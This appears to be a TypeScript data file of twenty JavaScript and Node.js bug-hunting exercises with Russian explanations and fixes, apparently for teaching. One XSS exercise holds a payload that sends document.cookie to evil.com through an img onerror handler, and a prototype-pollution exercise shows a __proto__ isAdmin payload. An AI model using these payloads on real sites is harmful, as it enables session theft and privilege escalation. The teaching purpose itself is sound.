import type { BugHuntItem } from '../types/bughunt';

export const bugHuntItems: BugHuntItem[] = [
  // ─── JS: Closures ────────────────────────────────────────────────────────
  {
    id: 'bh-01',
    title: 'Счётчики в цикле',
    topic: 'js-closures',
    topicLabel: 'Замыкания',
    difficulty: 'easy',
    language: 'javascript',
    code: `const fns = [];

for (var i = 0; i < 5; i++) {
  fns.push(function() {
    return i;
  });
}

console.log(fns[0]()); // ожидаем 0
console.log(fns[3]()); // ожидаем 3`,
    bugs: [
      {
        description: '`var` создаёт одну переменную на весь цикл — все функции замыкаются на одно и то же `i`',
        fix: 'Заменить `var i` на `let i`',
        explanation:
          'К моменту вызова функций цикл уже завершился и `i === 5`. Все пять функций видят одно и то же `i`. С `let` каждая итерация получает собственный binding переменной, поэтому замыкания изолированы. Альтернатива до ES6 — IIFE: `(function(j){ fns.push(() => j); })(i)`.',
      },
    ],
  },
  {
    id: 'bh-02',
    title: 'Приватный кеш утекает',
    topic: 'js-closures',
    topicLabel: 'Замыкания',
    difficulty: 'medium',
    language: 'javascript',
    code: `function createCache() {
  const cache = {};
  return {
    set(key, value) { cache[key] = value; },
    get(key) { return cache[key]; },
    getAll() { return cache; }, // ← проблема здесь
  };
}

const c = createCache();
c.set('token', 'secret');

const all = c.getAll();
all.token = 'hacked'; // изменяет внутренний кеш!`,
    bugs: [
      {
        description: '`getAll()` возвращает прямую ссылку на внутренний объект `cache` — любые изменения снаружи мутируют его',
        fix: 'Вернуть копию: `return { ...cache }` или `return Object.assign({}, cache)`',
        explanation:
          'Объекты передаются по ссылке. `getAll()` «пробивает» приватность замыкания: внешний код получает прямой доступ к cache и может изменить или прочитать любые внутренние данные. Решение: возвращать shallow copy (`{ ...cache }`) или deep copy (`structuredClone(cache)`) в зависимости от требований.',
      },
    ],
  },

  // ─── JS: Event Loop ──────────────────────────────────────────────────────
  {
    id: 'bh-03',
    title: 'Дебаунс без clearTimeout',
    topic: 'js-event-loop',
    topicLabel: 'Event Loop',
    difficulty: 'easy',
    language: 'javascript',
    code: `function debounce(fn, delay) {
  let timer;
  return function(...args) {
    timer = setTimeout(() => fn(...args), delay);
  };
}

const search = debounce(fetchResults, 300);
search('h');
search('he');
search('hel'); // ожидаем: один вызов fetchResults`,
    bugs: [
      {
        description: 'Отсутствует `clearTimeout(timer)` перед установкой нового — каждый вызов создаёт новый таймер, функция выполнится N раз',
        fix: 'Добавить `clearTimeout(timer);` в начало возвращаемой функции',
        explanation:
          'Смысл debounce — отменять предыдущий таймер при каждом новом вызове. Без `clearTimeout` за три вызова создаются три независимых `setTimeout`, и `fetchResults` вызовется три раза через 300ms. Правильно: сначала `clearTimeout(timer)`, затем `timer = setTimeout(...)`.',
      },
    ],
  },
  {
    id: 'bh-04',
    title: 'Потеря контекста в setTimeout',
    topic: 'js-event-loop',
    topicLabel: 'Event Loop',
    difficulty: 'easy',
    language: 'javascript',
    code: `class Poller {
  constructor() {
    this.count = 0;
  }

  start() {
    setInterval(function() {
      this.count++; // ← что такое this здесь?
      console.log(this.count);
    }, 1000);
  }
}

new Poller().start(); // NaN, NaN, NaN...`,
    bugs: [
      {
        description: 'Обычная функция в `setInterval` теряет `this` — внутри это `undefined` (strict) или `window`, а не экземпляр `Poller`',
        fix: 'Заменить `function()` на стрелочную `() =>` или сохранить `const self = this` перед setInterval',
        explanation:
          'setInterval вызывает callback без контекста — default binding даёт `window` или `undefined` в strict mode. Стрелочная функция лексически захватывает `this` из `start()`, где `this` — экземпляр Poller. Это классический паттерн: стрелочные функции идеальны как callback-и внутри методов класса.',
      },
    ],
  },

  // ─── JS: this ────────────────────────────────────────────────────────────
  {
    id: 'bh-05',
    title: 'Стрелочный метод объекта',
    topic: 'js-this',
    topicLabel: 'this и контекст',
    difficulty: 'easy',
    language: 'javascript',
    code: `const user = {
  name: 'Alice',
  greet: () => {
    console.log(\`Hello, \${this.name}!\`);
  },
};

user.greet(); // "Hello, undefined!" — почему?`,
    bugs: [
      {
        description: 'Стрелочная функция как метод объекта захватывает `this` из лексического окружения — глобального scope, а не из `user`',
        fix: 'Заменить стрелочную функцию на обычную: `greet() { ... }` или `greet: function() { ... }`',
        explanation:
          'Стрелочные функции не имеют собственного `this`. При определении в теле объектного литерала их `this` — это `this` внешнего scope (обычно `window` или `undefined` в strict). Для методов объекта и прототипа всегда используй обычные функции. Стрелочные функции подходят как callback внутри уже привязанных методов.',
      },
    ],
  },
  {
    id: 'bh-06',
    title: 'Повторный bind не работает',
    topic: 'js-this',
    topicLabel: 'this и контекст',
    difficulty: 'medium',
    language: 'javascript',
    code: `function getName() {
  return this.name;
}

const alice = { name: 'Alice' };
const bob = { name: 'Bob' };

const getAliceName = getName.bind(alice);
const getBobName = getAliceName.bind(bob); // попытка перебить привязку

console.log(getBobName()); // ожидаем 'Bob', получаем...?`,
    bugs: [
      {
        description: '`bind` создаёт «жёсткую» привязку — повторный `bind` на уже привязанную функцию не меняет `this`',
        fix: 'Вызвать `bind(bob)` на оригинальную функцию: `getName.bind(bob)`',
        explanation:
          'bind возвращает новую функцию с неизменяемым `this`. Под капотом она вызывает `call(originalThis, ...)` напрямую, игнорируя любые последующие попытки изменить контекст через bind, call или apply. Вывод: `getBobName()` вернёт `"Alice"`. Для создания новой привязки — bind только на оригинальную функцию.',
      },
    ],
  },

  // ─── JS: Async ───────────────────────────────────────────────────────────
  {
    id: 'bh-07',
    title: 'async внутри forEach',
    topic: 'js-async',
    topicLabel: 'Async / Промисы',
    difficulty: 'medium',
    language: 'javascript',
    code: `async function processAll(items) {
  const results = [];

  items.forEach(async (item) => {
    const result = await heavyProcess(item);
    results.push(result);
  });

  return results; // ← всегда []
}`,
    bugs: [
      {
        description: '`forEach` не является async-aware и не ждёт Promise-ы из async callback — `results` будет пустым при return',
        fix: 'Использовать `await Promise.all(items.map(async item => ...))` или `for...of` с await',
        explanation:
          'forEach просто вызывает каждый callback и игнорирует возвращаемый Promise. processAll завершается и возвращает пустой `results[]` до того, как завершится хоть одна операция heavyProcess. Для параллельного выполнения с ожиданием всех: `const results = await Promise.all(items.map(async item => heavyProcess(item)))`. Для последовательного: `for (const item of items) { results.push(await heavyProcess(item)); }`.',
      },
    ],
  },
  {
    id: 'bh-08',
    title: 'Проглоченный rejected Promise',
    topic: 'js-async',
    topicLabel: 'Async / Промисы',
    difficulty: 'easy',
    language: 'javascript',
    code: `async function loadUser(id) {
  const user = await fetch(\`/api/users/\${id}\`).then(r => r.json());
  return user;
}

// В другом месте:
loadUser(42);
// При ошибке fetch — UnhandledPromiseRejection!`,
    bugs: [
      {
        description: 'Промис, возвращаемый `loadUser`, не обрабатывается — при ошибке это `UnhandledPromiseRejection`, в Node.js 15+ завершает процесс',
        fix: 'Добавить `.catch()` при вызове или `await` внутри try/catch',
        explanation:
          'Любой rejected Promise без обработки — ошибка. В браузере это `unhandledrejection` событие. В Node.js 15+ — завершение процесса с exit code 1. Правильные варианты: `loadUser(42).catch(handleError)`, `await loadUser(42)` внутри try/catch, или глобальный `process.on("unhandledRejection", ...)` как последний рубеж.',
      },
    ],
  },
  {
    id: 'bh-09',
    title: 'Race condition в async',
    topic: 'js-async',
    topicLabel: 'Async / Промисы',
    difficulty: 'hard',
    language: 'javascript',
    code: `let currentData = null;

async function search(query) {
  const data = await fetch(\`/api/search?q=\${query}\`);
  currentData = await data.json(); // ← race condition
  renderResults(currentData);
}

// Быстрые вызовы:
search('js');      // запрос 1 (медленный, 500ms)
search('javascript'); // запрос 2 (быстрый, 100ms)
// Результат: покажет 'js', а не 'javascript'!`,
    bugs: [
      {
        description: 'Устаревший ответ (от более медленного запроса) может перезаписать актуальный — отображается неверный результат',
        fix: 'Использовать AbortController для отмены предыдущего запроса перед новым',
        explanation:
          'Race condition: два асинхронных запроса выполняются параллельно, порядок завершения непредсказуем. Запрос "javascript" завершился быстрее (100ms), но потом завершился запрос "js" (500ms) и перезаписал результат. Решение: `controller.abort()` при каждом новом вызове search, передать `signal` в fetch. Другой вариант — debounce + трекинг lastQueryId.',
      },
    ],
  },

  // ─── JS: Prototypes ──────────────────────────────────────────────────────
  {
    id: 'bh-10',
    title: 'Прототипное заражение (Prototype Pollution)',
    topic: 'js-prototypes',
    topicLabel: 'Прототипы',
    difficulty: 'hard',
    language: 'javascript',
    code: `function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object') {
      target[key] = target[key] || {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
}

const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, payload);

// Теперь у ВСЕХ объектов isAdmin = true!
console.log({}.isAdmin); // true — катастрофа`,
    bugs: [
      {
        description: 'Функция merge без проверки позволяет установить свойства через `__proto__`, заражая `Object.prototype` и все существующие объекты',
        fix: 'Добавить проверку: `if (key === "__proto__" || key === "constructor") continue;`',
        explanation:
          'Prototype Pollution — класс уязвимостей. При merge ключа `__proto__` изменяется Object.prototype, что влияет на все объекты в приложении. Злоумышленник может добавить `isAdmin: true` или перезаписать методы. Защита: проверять ключи, использовать `Object.hasOwn` вместо `in`, или `Object.create(null)` для «чистых» объектов без прототипа.',
      },
    ],
  },

  // ─── JS: DOM ─────────────────────────────────────────────────────────────
  {
    id: 'bh-11',
    title: 'XSS через innerHTML',
    topic: 'js-dom',
    topicLabel: 'DOM и события',
    difficulty: 'medium',
    language: 'javascript',
    code: `function renderComment(userInput) {
  const div = document.createElement('div');
  div.innerHTML = userInput; // ← XSS!
  document.body.appendChild(div);
}

// Атака:
renderComment('<img src=x onerror="fetch(\'//evil.com/?\' + document.cookie)">');`,
    bugs: [
      {
        description: 'Вставка пользовательского контента через `innerHTML` позволяет выполнить произвольный JavaScript — XSS-уязвимость',
        fix: 'Использовать `textContent` для текста или DOMPurify для HTML-контента',
        explanation:
          'innerHTML интерпретирует строку как HTML. Злоумышленник вставляет `<script>` или атрибуты-обработчики (`onerror`, `onclick`) для выполнения кода в контексте страницы. Безопасные альтернативы: `element.textContent = userInput` (экранирует HTML-теги), `DOMPurify.sanitize(html)` если нужен HTML-форматирование, `document.createTextNode()`.',
      },
    ],
  },
  {
    id: 'bh-12',
    title: 'Layout Thrashing в анимации',
    topic: 'js-dom',
    topicLabel: 'DOM и события',
    difficulty: 'medium',
    language: 'javascript',
    code: `function animateBoxes(boxes) {
  boxes.forEach(box => {
    const width = box.offsetWidth;  // чтение → принудительный reflow
    box.style.width = width + 10 + 'px'; // запись → откладывается
    // На следующей итерации: снова чтение → снова reflow
  });
}

// При 100 элементах: 100 принудительных reflow за один кадр`,
    bugs: [
      {
        description: 'Чередование чтения `offsetWidth` и записи `style.width` в цикле вызывает Layout Thrashing — N reflow вместо одного',
        fix: 'Разделить фазы: сначала все чтения в один массив, затем все записи',
        explanation:
          'Браузер откладывает reflow до конца JS-кода (batching). Но чтение геометрических свойств (`offsetWidth`, `getBoundingClientRect`, `scrollTop`) требует актуальных данных — браузер принудительно делает reflow немедленно (Forced Synchronous Layout). В цикле это N reflow. Решение: `const widths = boxes.map(b => b.offsetWidth)` — один batch чтений, затем `boxes.forEach((b, i) => b.style.width = ...)` — один batch записей.',
      },
    ],
  },

  // ─── Node.js: Event Loop ─────────────────────────────────────────────────
  {
    id: 'bh-13',
    title: 'Блокирующий readFileSync',
    topic: 'node-event-loop',
    topicLabel: 'Node.js Event Loop',
    difficulty: 'easy',
    language: 'javascript',
    code: `const express = require('express');
const fs = require('fs');
const app = express();

app.get('/config', (req, res) => {
  // Вызывается при каждом запросе:
  const config = fs.readFileSync('./config.json', 'utf8');
  res.json(JSON.parse(config));
});`,
    bugs: [
      {
        description: '`fs.readFileSync` блокирует Event Loop на время чтения файла — все остальные запросы ждут',
        fix: 'Использовать `await fs.promises.readFile(...)` или читать config один раз при старте',
        explanation:
          'readFileSync — синхронная операция, которая держит весь Node.js процесс занятым до завершения I/O. При высокой нагрузке это убивает throughput. Правильно: читать config один раз при старте сервера (`const config = require("./config.json")` или `await readFile` в init функции), или использовать асинхронный `fs.promises.readFile` и await.',
      },
    ],
  },
  {
    id: 'bh-14',
    title: 'EventEmitter утечка памяти',
    topic: 'node-event-loop',
    topicLabel: 'Node.js Event Loop',
    difficulty: 'medium',
    language: 'javascript',
    code: `const EventEmitter = require('events');
const bus = new EventEmitter();

function handleRequest(req) {
  bus.on('config-update', () => {
    // обновить настройки для этого запроса
    refreshConfig(req);
  });

  processRequest(req);
  // Подписчик не снимается!
}

// При 1000 запросах: 1000 подписчиков на 'config-update'`,
    bugs: [
      {
        description: 'Каждый вызов `handleRequest` добавляет нового подписчика на `config-update`, который никогда не удаляется — утечка памяти и неожиданное поведение',
        fix: 'Использовать `bus.once(...)` или явно вызывать `bus.off()` после использования',
        explanation:
          'EventEmitter не ограничивает количество подписчиков (предупреждение при > 10, но работа продолжается). Каждый обработчик держит ссылку на `req` — GC не может освободить объекты запроса. Node.js предупреждает MaxListenersExceededWarning. Решение: `bus.once("config-update", handler)` — автоматически снимается. Или сохранить handler в переменную и вызвать `bus.off("config-update", handler)` по завершении запроса.',
      },
    ],
  },

  // ─── Node.js: Streams ────────────────────────────────────────────────────
  {
    id: 'bh-15',
    title: 'pipe без обработки ошибок',
    topic: 'node-streams',
    topicLabel: 'Стримы',
    difficulty: 'medium',
    language: 'javascript',
    code: `const fs = require('fs');
const zlib = require('zlib');

function compress(inputPath, outputPath) {
  fs.createReadStream(inputPath)
    .pipe(zlib.createGzip())
    .pipe(fs.createWriteStream(outputPath));

  // Если inputPath не существует — что произойдёт?
}`,
    bugs: [
      {
        description: 'При ошибке в любом стриме (файл не найден, диск заполнен) — ошибка не распространяется по цепочке, writeStream остаётся открытым',
        fix: 'Заменить на `stream/promises pipeline` или добавить `.on("error", handler)` на каждый стрим',
        explanation:
          'В отличие от pipeline, pipe не пропагирует ошибки вниз по цепочке. Если readStream упадёт с ENOENT — gzip и writeStream не узнают об ошибке и не закроются. Это утечка файловых дескрипторов. pipeline из `stream/promises` автоматически вызывает `destroy()` на все стримы при любой ошибке и возвращает rejected Promise.',
      },
    ],
  },

  // ─── Node.js: Optimization ───────────────────────────────────────────────
  {
    id: 'bh-16',
    title: 'Глобальный кеш без ограничений',
    topic: 'node-optimization',
    topicLabel: 'Оптимизация',
    difficulty: 'medium',
    language: 'javascript',
    code: `const cache = new Map(); // глобальный — живёт весь процесс

app.get('/user/:id', async (req, res) => {
  const { id } = req.params;

  if (!cache.has(id)) {
    const user = await db.findUser(id);
    cache.set(id, user);
  }

  res.json(cache.get(id));
  // При 100 000 уникальных пользователей — ?
});`,
    bugs: [
      {
        description: 'Map растёт неограниченно — при большом числе уникальных ID heap заполнится, процесс упадёт с OOM',
        fix: 'Использовать LRU Cache с ограниченным размером или добавить TTL-инвалидацию',
        explanation:
          'Неограниченный глобальный кеш — классическая утечка памяти в Node.js серверах. При достаточно долгой работе или большом количестве уникальных ключей memory usage растёт до OOM. Решение: LRU с capacity (например 1000 записей), или кеш с TTL, или использовать Redis для распределённого кеша с автоматическим expiration.',
      },
    ],
  },
  {
    id: 'bh-17',
    title: 'N+1 запросов к базе',
    topic: 'node-optimization',
    topicLabel: 'Оптимизация',
    difficulty: 'medium',
    language: 'javascript',
    code: `async function getPostsWithAuthors(postIds) {
  const posts = await db.query(
    'SELECT * FROM posts WHERE id = ANY($1)', [postIds]
  );

  // Загружаем автора для каждого поста:
  for (const post of posts) {
    post.author = await db.query(
      'SELECT * FROM users WHERE id = $1', [post.authorId]
    );
  }

  return posts;
}

// При 100 постах: 1 + 100 = 101 запрос к БД`,
    bugs: [
      {
        description: 'N+1 проблема: один запрос на список постов + N запросов на каждого автора — линейная зависимость от количества постов',
        fix: 'Загрузить всех авторов одним запросом `WHERE id = ANY($1)` или использовать JOIN',
        explanation:
          'N+1 — одна из самых распространённых проблем производительности БД. При 100 постах делается 101 запрос, при 1000 — 1001. Решение 1: загрузить все уникальные authorId, один SELECT WHERE id IN (...), соединить в памяти. Решение 2: JOIN в SQL. Решение 3 (GraphQL): DataLoader батчирует запросы за один тик event loop. Всегда анализируй количество SQL-запросов через логирование или explain analyze.',
      },
    ],
  },

  // ─── Node.js: Network ────────────────────────────────────────────────────
  {
    id: 'bh-18',
    title: 'Отсутствие rate limiting',
    topic: 'node-network',
    topicLabel: 'Сеть / HTTP',
    difficulty: 'medium',
    language: 'javascript',
    code: `app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await db.findByEmail(email);
  const valid = await bcrypt.compare(password, user.passwordHash);

  if (valid) {
    res.json({ token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
  // Нет ограничения на попытки!
});`,
    bugs: [
      {
        description: 'Без rate limiting endpoint уязвим к brute-force атакам — атакующий может перебирать пароли с любой скоростью',
        fix: 'Добавить rate limiting (express-rate-limit) или account lockout после N неудачных попыток',
        explanation:
          'bcrypt.compare намеренно медленный (~100ms), но без rate limiting атакующий всё равно может делать 600+ попыток в минуту с нескольких IP. Защита: rate limiting по IP (express-rate-limit), экспоненциальный backoff после неудач, lockout аккаунта на X минут, CAPTCHA, мониторинг аномальной активности. Для production также: не различать "пользователь не найден" и "неверный пароль" в ответе.',
      },
    ],
  },
  {
    id: 'bh-19',
    title: 'Credentials в CORS wildcard',
    topic: 'node-network',
    topicLabel: 'Сеть / HTTP',
    difficulty: 'medium',
    language: 'javascript',
    code: `app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});

// Клиент:
fetch('/api/data', { credentials: 'include' });`,
    bugs: [
      {
        description: '`Access-Control-Allow-Origin: *` несовместимо с `Access-Control-Allow-Credentials: true` — браузер отклонит ответ',
        fix: 'Указать конкретный origin: `res.setHeader("Access-Control-Allow-Origin", req.headers.origin)` с whitelist проверкой',
        explanation:
          'Спецификация CORS запрещает wildcard origin при использовании credentials (cookies, HTTP auth, TLS сертификаты). Браузер выбросит ошибку: "The value of the Access-Control-Allow-Origin header must not be the wildcard when the request\'s credentials mode is include". Решение: динамически устанавливать конкретный origin из whitelist. Это преднамеренная мера безопасности — credentials не должны отправляться на любой сайт.',
      },
    ],
  },
  {
    id: 'bh-20',
    title: 'Синхронный JSON.parse без защиты',
    topic: 'js-async',
    topicLabel: 'Async / Промисы',
    difficulty: 'easy',
    language: 'javascript',
    code: `async function processWebhook(req, res) {
  const payload = JSON.parse(req.body); // ← опасно

  if (payload.event === 'payment') {
    await processPayment(payload.data);
  }

  res.sendStatus(200);
}`,
    bugs: [
      {
        description: '`JSON.parse` бросает `SyntaxError` при невалидном JSON — необработанное исключение сломает async обработчик',
        fix: 'Обернуть в try/catch или использовать безопасный парсер',
        explanation:
          'JSON.parse синхронно бросает исключение для любых невалидных входных данных. В async функции необработанный throw приводит к rejected Promise, который без .catch() даёт UnhandledPromiseRejection. В Express — зависший запрос или crash. Правильно: `try { const payload = JSON.parse(body); } catch (e) { return res.status(400).json({ error: "Invalid JSON" }); }`. Также: express.json() middleware уже делает парсинг с обработкой ошибок.',
      },
    ],
  },
];
